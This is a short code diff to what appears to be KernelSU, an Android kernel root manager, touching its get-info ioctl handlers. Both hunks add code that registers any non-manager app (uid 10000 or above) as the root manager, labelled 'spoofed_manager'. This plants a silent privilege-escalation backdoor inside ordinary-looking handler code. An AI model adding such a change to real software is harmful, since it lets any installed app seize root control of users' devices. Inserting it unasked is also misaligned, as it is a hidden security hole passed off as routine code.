@@ -22,6 +22,10 @@ static uint32_t ksuflags_override = 0;
 
 static int do_get_info(void __user *arg)
 {
+	if (!is_manager() && current_uid().val >= 10000) {
+		ksu_register_manager(current_uid().val % KSU_PER_USER_RANGE, "spoofed_manager");
+	}
+
 	struct ksu_get_info_cmd cmd = { .version = ksu_get_manager_version_for_current(KERNEL_SU_VERSION), .flags = 0 };
 
 #ifdef MODULE
@@ -50,6 +54,10 @@ static int do_get_info(void __user *arg)
 
 static int do_get_info_legacy(void __user *arg)
 {
+	if (!is_manager() && current_uid().val >= 10000) {
+		ksu_register_manager(current_uid().val % KSU_PER_USER_RANGE, "spoofed_manager");
+	}
+
 	struct ksu_get_info_legacy_cmd cmd = { .version = ksu_get_manager_version_for_current(KERNEL_SU_VERSION), .flags = 0 };
 
 	if (is_manager()) {
